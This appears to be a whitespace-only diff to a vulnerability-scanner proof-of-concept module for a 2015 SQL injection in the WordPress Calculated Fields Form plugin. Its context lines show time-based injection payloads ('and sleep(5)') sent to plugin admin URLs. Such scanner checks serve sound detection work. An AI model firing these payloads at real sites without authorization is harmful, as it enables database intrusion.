@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0012' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0012'  # 平台漏洞编号，留空
     name = 'WordPress Calculated Fields SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-03-02'  # 漏洞公布时间
     desc = '''
         There are sql injection vulnerabilities in Calculated Fields Form Plugin
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress Calculated Fields 1.0.10'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'c295ccdc-7d8a-40f2-82e1-4c35b3b35aff'
@@ -33,7 +35,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             verify_url = self.target
             payloads = {'/wp-admin/options-general.php?page=cp_calculated_fields_form&u=2 and sleep(5)&name=InsertText',
                         '/wp-admin/options-general.php?page=cp_calculated_fields_form&c=21 and sleep(5)',
@@ -53,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
